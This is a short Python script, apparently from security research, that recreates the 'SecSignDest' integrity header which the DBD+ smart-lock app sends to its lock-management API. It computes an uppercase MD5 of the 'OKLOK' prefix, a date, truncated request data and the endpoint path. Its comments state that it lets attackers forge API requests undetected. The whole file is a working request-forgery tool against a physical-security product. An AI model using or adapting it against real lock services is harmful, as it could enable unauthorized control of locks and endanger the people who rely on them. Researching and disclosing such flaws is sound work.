#!/bin/python3

import js2py
import hashlib

# This function generates the value used in the "SecSignDest" header which the DBD+ app includes in all HTTP requests to the lock-management API

# The API server uses the "SecSignDest" header value to validate request integrity meaning this function can allow attackers to forge requests to the API undetected

def generate_signkey(date_string, request_data, api_endpoint):

	prefix_string = "OKLOK"

	split_req_data = js2py.eval_js('function split_req_data(v){ if(v.length > 100) { v = (v = v.substr(4, 20) + v.substr(v.length - 10, 30));} return v;}')

	api_endpoint = "/app/" + api_endpoint

	key_string = prefix_string + str(date_string) + str(split_req_data(request_data)) + str(api_endpoint)

	key_digest = hashlib.md5(key_string.encode('utf-8')).hexdigest()

	return str(key_digest).upper()